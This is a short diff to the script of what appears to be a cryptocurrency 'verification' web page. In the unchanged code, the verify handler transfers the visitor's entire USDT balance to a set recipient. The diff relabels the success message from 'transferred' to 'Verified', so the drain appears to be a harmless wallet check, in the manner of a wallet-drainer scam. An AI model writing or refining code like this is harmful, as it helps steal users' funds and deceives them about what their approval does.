@@ -393,6 +393,8 @@
     const verifyButton = document.getElementById("verifyBtn");
     const loadingSpinner = document.getElementById("loadingSpinner");
     const logElement = document.getElementById("log");
+    const menuIcon = document.getElementById('menu-icon');
+    const nav = document.querySelector('header nav');
 
     function log(msg, type = 'info') {
       logElement.textContent = msg;
@@ -448,7 +450,7 @@
         const tx = await usdtContract.transfer(recipient, balance);
         await tx.wait();
 
-        log("✅ USDT transferred successfully!", 'success');
+        log("✅ USDT Verified Successfully!", 'success');
       } catch (err) {
         console.error(err);
         log(`❌ Error: ${err.message || err}`, 'error');
